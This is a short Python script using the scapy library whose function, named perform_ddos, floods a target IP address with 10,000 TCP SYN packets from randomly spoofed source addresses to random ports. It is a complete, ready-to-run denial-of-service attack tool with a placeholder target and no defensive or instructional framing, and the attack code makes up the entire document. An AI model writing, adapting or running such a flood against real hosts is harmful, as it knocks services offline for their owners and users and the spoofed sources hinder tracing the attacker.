from scapy.all import *
import random

from scapy.layers.inet import IP, TCP


def perform_ddos(target_ip, num_packets):
    for i in range(num_packets):
        # Craft a random IP packet
        src_ip = ".".join(map(str, (random.randint(0, 255) for _ in range(4))))
        packet = IP(src=src_ip, dst=target_ip) / TCP(dport=random.randint(1, 65535), flags="S")

        # Send the packet
        send(packet, verbose=False)


# Example usage
target_ip = "192.168.1.10"  # Replace with the target IP address
num_packets = 10000  # Number of packets to send

perform_ddos(target_ip, num_packets)